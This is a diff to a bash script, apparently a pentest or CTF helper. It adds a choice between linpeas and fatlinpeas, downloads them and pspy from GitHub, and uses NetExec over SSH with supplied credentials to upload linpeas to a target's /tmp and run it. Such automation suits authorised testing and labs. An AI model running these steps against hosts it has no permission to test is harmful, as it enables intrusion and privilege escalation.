@@ -19,20 +19,29 @@ step() {
 
 set -e
 
-# Define latest release URLs
-LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+# Prompt for linpeas version
+read -p "Do you want to use fatlinpeas? (y/n): " USE_FAT
+
+if [[ "$USE_FAT" =~ ^[Yy]$ ]]; then
+    LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_fat.sh"
+    LINPEAS_NAME="linpeas_fat.sh"
+else
+    LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+    LINPEAS_NAME="linpeas.sh"
+fi
+
 PSPY_URL="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
 
-step 1 "Downloading latest linpeas.sh"
-curl -sSL "$LINPEAS_URL" -o linpeas.sh
-chmod +x linpeas.sh
+step 1 "Downloading latest $LINPEAS_NAME"
+curl -sSL "$LINPEAS_URL" -o "$LINPEAS_NAME"
+chmod +x "$LINPEAS_NAME"
 
 step 2 "Downloading latest pspy64"
 curl -sSL "$PSPY_URL" -o pspy64
 chmod +x pspy64
 
-step 3 "Uploading linpeas.sh"
-nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file linpeas.sh /tmp/linpeas.sh > /dev/null 2>&1
+step 3 "Uploading $LINPEAS_NAME"
+nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file "$LINPEAS_NAME" /tmp/linpeas.sh > /dev/null 2>&1
 
 step 4 "Running linpeas.sh"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out" > /dev/null 2>&1
